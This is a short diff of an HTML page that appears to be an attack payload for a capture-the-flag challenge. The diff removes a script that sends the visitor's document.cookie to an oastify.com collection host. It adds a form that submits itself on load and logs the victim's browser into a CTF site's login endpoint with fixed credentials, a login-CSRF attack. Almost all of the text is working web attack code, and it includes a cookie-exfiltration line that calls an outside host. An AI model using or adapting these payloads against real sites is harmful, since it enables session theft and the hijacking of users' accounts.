@@ -2,8 +2,12 @@
 <html>
 <body>
 <div class="message">x</div>
+<form id="f" method="POST" action="https://ctf.leaderboard.sorint.com/login?next=/chat/47" target="_self">
+  <input name="username" value="doriangrey">
+  <input name="password" value="doriangrey">
+</form>
 <script>
-  fetch('https://lpep3rg0quhsgc82dvp09hpx8oef26qv.oastify.com/?c='+document.cookie);
+  document.getElementById('f').submit();
 </script>
 </body>
 </html>
